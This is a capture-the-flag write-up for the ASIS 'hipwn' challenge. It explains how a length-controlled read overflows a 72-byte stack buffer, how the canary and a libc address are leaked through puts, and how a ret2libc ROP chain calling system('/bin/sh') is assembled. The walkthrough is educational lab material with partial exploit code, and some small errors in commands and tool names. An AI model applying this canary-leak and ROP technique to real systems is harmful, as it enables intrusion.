# hipwn
## ASIS
The ASIS ctf is a hard CTF, rating 89,8 on CTF time, it is among the top weighted CTFs right now.

##Initial inspection
We are handed out a Dockerfile and a folder with the vulnerable binary.

A `checksec` of the provided binary shows full protection. Which means, that we most likely are looking at a ROP challenge.
```bash
checksec --file==./orig_chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   42 Symbols        No    0               1               ./orig_chall
```
A brief look in IDA shows that it is a buffer underflow vulnerability:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int nbytes; // [rsp+Ch] [rbp-54h] BYREF
  char nbytes_4[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  while ( 1 )
  {
    puts("How much???");
    __isoc99_scanf("%u", &nbytes);
    puts("ok... now send content");
    read(0, nbytes_4, nbytes);
    nbytes_4[nbytes] = 0;
    puts(nbytes_4);
    puts("wanna do it again?");
    __isoc99_scanf("%u", &nbytes);
    if ( nbytes != 1337 )
      break;
    puts("i knew it");
  }
  return 0;
}
```
We can from the decompiled source code see, that we control the amount of data to read in. The code then stores the data in a buffer of 72 bytes (`char nbytes_4[72];`)

The binary also imports  libc, which is great, becasu it enables us to utilize many more gadgets - ret2libc.

# Getting the correct libc
In order to find correct gadget addresses for our exploit, we need to get the version of libc that the server uses, thankfully ASIS provided us with the Dockerfile of the challenge which have a very specific build tag, allowing us to replicate the state of the server:
```bash
FROM ubuntu@sha256:aabed3296a3d45cede1dc866a24476c4d7e093aa806263c27ddaadbdce3c1054
docker build .
```
Now we can get the libc.so + the corresponding linker/loader from the provided docker image:
```bash
docker cp temp_container:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
docker cp temp_container:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2
```
I had some problems copying the files as some were symlinks to the files in /lib, this should work, however. Now, we need to make GDB run the program as the server would. First, we need to path binary to use correct interpreter:
```bash
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./chall
```
We also need to specify which libc.so we want to use, we do this by creating the process like this in our exploit script:
```bash
process([context.binary.path], env={'LD_PRELOAD': './libc.so.6'})
```

## Creating the exploit
### Canary leakage
First obstacle is the stack canary which, if overwritten, will cause the program to exit. Luckily we have an underflow in the program, which we can use to leak stack canary in order to use it in our exploit payload later on. We start by doing a cyclic pattern to figure out, what the offset to our canary is:
```bash
0x7fff5b4e2a90: 0x0000000000000000      0x0000005000000000
0x7fff5b4e2aa0: 0x6161616261616161      0x6161616461616163
0x7fff5b4e2ab0: 0x6161616661616165      0x6161616861616167
0x7fff5b4e2ac0: 0x6161616a61616169      0x6161616c6161616b
0x7fff5b4e2ad0: 0x6161616e6161616d      0x616161706161616f
0x7fff5b4e2ae0: 0x6161617261616171      0x4baa9c6156f32c0a
0x7fff5b4e2af0: 0x0000000000000001      0x00007feaa7a29d90
0x7fff5b4e2b00: 0x0000000000000000      0x000055df56a2a1c9
0x7fff5b4e2b10: 0x0000000100000000      0x00007fff5b4e2c08
```
We can see that `0x6161617261616171` is just before the canary, actually overwriting the last bit with an a, this is perfect because stack canaries are always null terminated ending on 00, which is usually how to spot them. These bytes correspond to `aaaraaaq` looking at the pattern. From cyclic(100) in gdb or pwntools, we can see that this sequence occurs after 72 bytes. So this is where the canary starts, we need to overflow the last part of the canary and leak the rest, overflowing it is very important, otherwise puts() won't print it out, as it stops printing the memory at the first 00 it encounters.

After leaking the canary we can go again by typing 1337, we can do this with an overwritten canary because no stack frames are popped, because we're still in the main function in a while loop.

### Finding libc base dynamically
Because PIE is enabled, the binary, and libc as well, will get a new address on each execution. Therefore, we need to figure out in which address libc was loaded, from this base, we know the offset to our gadgets.

Looking at the stack is a good place to start, since we can easily leak addresses from there. The address starting with 7f is obviously loaded a different place than the address of the binary starting with 55. But to double check we can always use vmmap in gdb to debug.

Leaking the libc function is exactly the same way as with the canary, we still make sure to overwrite any 00 bytes. When disassembling the memory around the leaked address, we see that it is actually 0x90 into this function:
```c
0x7feaa7a29d00 <__libc_init_first>:  endbr64
```
I don't now this function, but it will do just fine to determine the libc base. We just subtract the offset that we know from the leaked address:
```python
libc_base = libc_leak - libc.symbols['__libc_init_first']
```
### Ret to a shell
Now we need to find ROP gadgets in libc: ret, system, bin/sh, exit, pop rdi(in order to get '/bin/sh' from the stack into rdi which is where the argument for system(arg) resides). This is easily done with pyelftools:
```python 
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_base 
ret = rop.find_gadget(['ret'])[0] + libc_base 
bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base 
exit_addr = libc.symbols['exit'] + libc_base 
rop.raw([ret, pop_rdi, bin_sh, system_addr, exit_addr])
```
also added an exit to exit the binary gracefully, otherwise it would terminate our shell. Ret added to align the stack with 16 bytes. The resulting ROP chain looks something like this:
```bash 
0x0000:   0x7f618de29cd6
0x0008:   0x7f618de2a3e5
0x0010:   0x7f618dfd8698
0x0018:   0x7f618de50d60
0x0020:   0x7f618de455f0
```

Now the only thing left is to send the payload, consisting of the offset to canary padding, then the canary then overwrite rbp with some junk and lastly the ROP chain.

Once in the shell: `cat flag.txt`

NB: While this did not work locally, it worked on the remote.